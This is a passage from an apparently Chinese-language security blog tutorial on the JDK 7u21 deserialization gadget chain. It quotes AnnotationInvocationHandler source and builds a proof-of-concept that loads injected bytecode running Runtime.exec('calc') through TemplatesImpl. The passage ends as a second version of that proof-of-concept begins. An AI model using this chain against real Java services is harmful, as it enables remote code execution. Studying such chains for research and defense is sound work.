</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">memberValueHashCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getValue</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">result</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">int</span> <span style="color:#61afef;font-weight:bold">memberValueHashCode</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;</span> <span style="color:#e06c75">type</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isArray</span><span style="color:#56b6c2">())</span>    <span style="color:#7f848e">// primitive, string, class, enum const,
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>                                <span style="color:#7f848e">// or annotation
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">char</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">char</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">double</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">double</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">float</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">float</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">int</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">int</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">long</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">long</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">short</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">short</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">boolean</span><span style="color:#56b6c2">[].</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e5c07b">boolean</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">Arrays</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hashCode</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>我们注意到在<code>invoke</code>方法内部调用了<code>equalsImpl</code>方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>	<span style="color:#c678dd">public</span> <span style="color:#e06c75">Object</span> <span style="color:#61afef;font-weight:bold">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">proxy</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Method</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?&gt;[]</span> <span style="color:#e06c75">paramTypes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">method</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getParameterTypes</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;equals&#34;</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">1</span> <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">paramTypes</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">args</span><span style="color:#56b6c2">[</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">]);</span>
</span></span><span style="display:flex;"><span>        	<span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e06c75">Boolean</span> <span style="color:#61afef;font-weight:bold">equalsImpl</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Object</span> <span style="color:#e06c75">o</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        	<span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Method</span> <span style="color:#e06c75">memberMethod</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">getMemberMethods</span><span style="color:#56b6c2">())</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">String</span> <span style="color:#e06c75">member</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">ourValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">AnnotationInvocationHandler</span> <span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">asOneOfUs</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">hisHandler</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hisHandler</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">memberValues</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">member</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#e06c75">hisValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">memberMethod</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">invoke</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">o</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationTargetException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalAccessException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">AssertionError</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(!</span><span style="color:#e06c75">memberValueEquals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ourValue</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hisValue</span><span style="color:#56b6c2">))</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e5c07b">false</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">true</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以发现<code>equalsImpl</code>方法有一个任意方法调用，但是要求无参。很容易想到<code>TemplatesImpl</code>类，它的<code>newTransformer()</code>方法能够用于动态加载恶意类，符合无参要求</p>
<h4 id="构造第一部分poc">构造第一部分POC</h4>
<p>首先写出<code>TemplatesImpl</code>动态加载的部分。这里为了简化操作，引入<code>Javassist</code>操作字节码</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.CannotCompileException</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.ClassPool</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.CtClass</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.NotFoundException</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javax.xml.transform.TransformerConfigurationException</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.lang.reflect.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk7u21Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">TransformerConfigurationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">CtClass</span> <span style="color:#e06c75">cc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">test</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">String</span> <span style="color:#e06c75">cmd</span> <span style="color:#56b6c2">=</span> <span style="color:#98c379">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;);&#34;</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">makeClassInitializer</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">insertBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">cmd</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setSuperclass</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">pool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">AbstractTranslet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getName</span><span style="color:#56b6c2">())));</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">TemplatesImpl</span> <span style="color:#e06c75">templatesImpl</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">TemplatesImpl</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Class</span> <span style="color:#e06c75">tc</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getClass</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">nameField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_name&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">nameField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#98c379">&#34;a&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//由于getTransletInstance中_name=null会retrun null，所以利用反射，将_name赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">bytecodesField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_bytecodes&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">codes</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">cc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toBytecode</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]</span> <span style="color:#e06c75">bytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[][]{</span><span style="color:#e06c75">codes</span><span style="color:#56b6c2">};</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">bytecodesField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//同理defineTransletClasses中_bytecodes == null会抛出异常，所以将其赋值
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Field</span> <span style="color:#e06c75">tfactoryField</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">tc</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDeclaredField</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;_tfactory&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">setAccessible</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">true</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">tfactoryField</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">set</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">,</span><span style="color:#c678dd">new</span> <span style="color:#e06c75">TransformerFactoryImpl</span><span style="color:#56b6c2">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//本意是为了在defineTransletClasses中，避免_tfactory值为null，导致_tfactory.getExternalExtensionsMap()错误
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#7f848e">//但实际上并不影响代码执行
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newTransformer</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>接下来开始接上 <code>AnnotationInvocationHandler</code> 的 <code>equals</code> 方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.CannotCompileException</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.ClassPool</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.CtClass</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javassist.NotFoundException</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">javax.xml.transform.Templates</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.io.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.lang.reflect.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">java.util.*</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">public</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">jdk7u21Chain</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">test</span><span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">main</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">args</span><span style="color:#56b6c2">)</span> <span style="color:#c678dd">throws</span> <span style="color:#e06c75">NoSuchFieldException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">IllegalAccessException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">CannotCompileException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">NoSuchMethodException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InvocationTargetException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">InstantiationException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">ClassPool</span> <span style="color:#e06c75">pool</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ClassPool</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getDefault</span><span style="color:#56b6c2">();</span>
